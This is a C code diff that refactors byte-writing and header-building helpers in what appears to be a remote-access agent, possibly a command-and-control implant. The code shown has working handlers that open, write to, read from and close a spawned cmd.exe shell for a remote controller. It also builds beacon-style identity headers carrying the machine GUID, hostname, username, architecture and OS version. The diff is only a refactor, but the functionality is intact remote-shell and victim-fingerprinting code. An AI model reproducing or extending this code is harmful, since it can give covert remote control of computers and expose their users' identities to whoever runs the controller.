@@ -10,7 +10,8 @@ DWORD Handle_ShellOpen(const agent_ctx *ctx, unsigned int corr_id, unsigned char
         unsigned char status_error[8];
         MemoryZero(status_error, sizeof(status_error));
 
-        write_u32_le_at(status_error, 4, corr_id);
+        int pos = 4;
+        WriteU32LE(status_error, &pos, corr_id);
 
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
@@ -20,9 +21,9 @@ DWORD Handle_ShellOpen(const agent_ctx *ctx, unsigned int corr_id, unsigned char
     }
 
     int pos = 0;
-    write_u32_le(reply, &pos, STATUS_OK);
-    write_u32_le(reply, &pos, corr_id);
-    write_u64_le(reply, &pos, (unsigned long long)id);
+    WriteU32LE(reply, &pos, STATUS_OK);
+    WriteU32LE(reply, &pos, corr_id);
+    WriteU64LE(reply, &pos, (unsigned long long)id);
 
     *reply_len = 16;
     LOG_INFO("Shell with ID %d opened (cmd.exe spawned)", id);
@@ -46,8 +47,8 @@ DWORD Handle_ShellWrite(const agent_ctx *ctx, const incoming_message *msg, unsig
     }
 
     int pos = 0;
-    write_u32_le(reply, &pos, (DWORD)status);
-    write_u32_le(reply, &pos, corr_id);
+    WriteU32LE(reply, &pos, (DWORD)status);
+    WriteU32LE(reply, &pos, corr_id);
     *reply_len = 8;
     LOG_INFO("Write to shell %u: %lu byte(s)", (UINT32)id, (unsigned long)(msg->length - 13));
     return (DWORD)status;
@@ -63,7 +64,8 @@ DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, unsign
         unsigned char status_error[8];
         MemoryZero(status_error, sizeof(status_error));
 
-        write_u32_le_at(status_error, 4, corr_id);
+        int pos = 4;
+        WriteU32LE(status_error, &pos, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
 
         *reply_len = sizeof(status_error);
@@ -79,7 +81,8 @@ DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, unsign
         unsigned char status_error[8];
         MemoryZero(status_error, sizeof(status_error));
 
-        write_u32_le_at(status_error, 4, corr_id);
+        int pos = 4;
+        WriteU32LE(status_error, &pos, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
 
@@ -88,8 +91,8 @@ DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, unsign
     }
 
     int pos = 0;
-    write_u32_le(chunk, &pos, STATUS_OK);
-    write_u32_le(chunk, &pos, corr_id);
+    WriteU32LE(chunk, &pos, STATUS_OK);
+    WriteU32LE(chunk, &pos, corr_id);
 
     chunk[8 + got] = '\0';
     MemoryCopy(reply, chunk, 8 + got + 1);
@@ -118,8 +121,8 @@ DWORD Handle_ShellClose(const agent_ctx *ctx, const incoming_message *msg, unsig
     }
 
     int pos = 0;
-    write_u32_le(reply, &pos, STATUS_OK);
-    write_u32_le(reply, &pos, corr_id);
+    WriteU32LE(reply, &pos, STATUS_OK);
+    WriteU32LE(reply, &pos, corr_id);
     *reply_len = 8;
     return STATUS_OK;
 }
@@ -130,49 +133,72 @@ USIZE Handle_IdentityHeaders(CHAR headers[IDENTITY_HEADERS_SIZE])
     hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
     CHAR piece[64];
 
-    StrHdrApiVersion(piece);  hw_puts(&w, piece);  hw_crlf(&w);
-    StrHdrNameId(piece);      hw_puts(&w, piece);  hw_crlf(&w);
-    StrHdrPlatform(piece);    hw_puts(&w, piece);  hw_crlf(&w);
-    StrHdrCaps(piece);        hw_puts(&w, piece);  hw_crlf(&w);
+    BuildApiVersionHeader(piece);  WriteText(&w, piece);  WriteText(&w, "\r\n");
+    BuildAgentNameIdHeader(piece); WriteText(&w, piece);  WriteText(&w, "\r\n");
+    BuildPlatformHeader(piece);    WriteText(&w, piece);  WriteText(&w, "\r\n");
+    BuildClientFeaturesHeaderPrefix(piece);
+    WriteText(&w, piece);
+
+    CHAR hex[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
+    CapabilityMask mask = BuildCapabilityMask();
+    
+    for (USIZE i = 0; w.ok && i < CAPABILITY_MASK_BYTES; i++) {
+        CHAR byte[3] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF], '\0'};
+        WriteText(&w, byte);
+    }
+    WriteText(&w, "\r\n");
 
     CHAR guid_text[40];
     if (read_machine_guid_text(guid_text)) {
-        StrLblUuid(piece);
-        hw_header(&w, piece, guid_text);
+        BuildMachineUuidHeaderPrefix(piece);
+        WriteText(&w, piece);
+        WriteText(&w, guid_text);
+        WriteText(&w, "\r\n");
     }
 
     system_facts facts;
     collect_system_facts(&facts);
 
-    StrLblHostname(piece);
-    if (facts.hostname[0] != '\0')
-        hw_header(&w, piece, facts.hostname);
+    BuildHostnameHeaderPrefix(piece);
+    if (facts.hostname[0] != '\0') {
+        WriteText(&w, piece);
+        WriteText(&w, facts.hostname);
+        WriteText(&w, "\r\n");
+    }
 
-    StrLblUsername(piece);
-    if (facts.username[0] != '\0')
-        hw_header(&w, piece, facts.username);
+    BuildUsernameHeaderPrefix(piece);
+    if (facts.username[0] != '\0') {
+        WriteText(&w, piece);
+        WriteText(&w, facts.username);
+        WriteText(&w, "\r\n");
+    }
 
 #if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) || defined(_M_X64)
-    StrValArchX64(piece);
+    BuildX64ArchitectureHeaders(piece);
 #elif defined(ENVIRONMENT_ARM64) || defined(__aarch64__) || defined(_M_ARM64)
-    StrValArchArm64(piece);
+    BuildArm64ArchitectureHeaders(piece);
 #else
-    StrValArchI386(piece);
+    BuildI386ArchitectureHeaders(piece);
 #endif
-    hw_puts(&w, piece);  hw_crlf(&w);
+    WriteText(&w, piece);  WriteText(&w, "\r\n");
 
-    StrLblOsVersion(piece);
-    if (facts.os_version[0] != '\0')
-        hw_header(&w, piece, facts.os_version);
+    BuildOsVersionHeaderPrefix(piece);
+    if (facts.os_version[0] != '\0') {
+        WriteText(&w, piece);
+        WriteText(&w, facts.os_version);
+        WriteText(&w, "\r\n");
+    }
 
-    StrLblBuild(piece);
-    hw_puts(&w, piece);
-    hw_u32_decimal(&w, (UINT32)ID_BUILD_NUMBER);
-    hw_crlf(&w);
+    BuildOsBuildHeaderPrefix(piece);
+    WriteText(&w, piece);
+    WriteDecimal(&w, (UINT32)ID_BUILD_NUMBER);
+    WriteText(&w, "\r\n");
 
-    StrLblCommit(piece);
-    StrCommitDefault(piece + 32);
-    hw_header(&w, piece, piece + 32);
+    BuildCommitHeaderPrefix(piece);
+    BuildDefaultCommitHash(piece + 32);
+    WriteText(&w, piece);
+    WriteText(&w, piece + 32);
+    WriteText(&w, "\r\n");
 
     if (!w.ok)
         return 0;
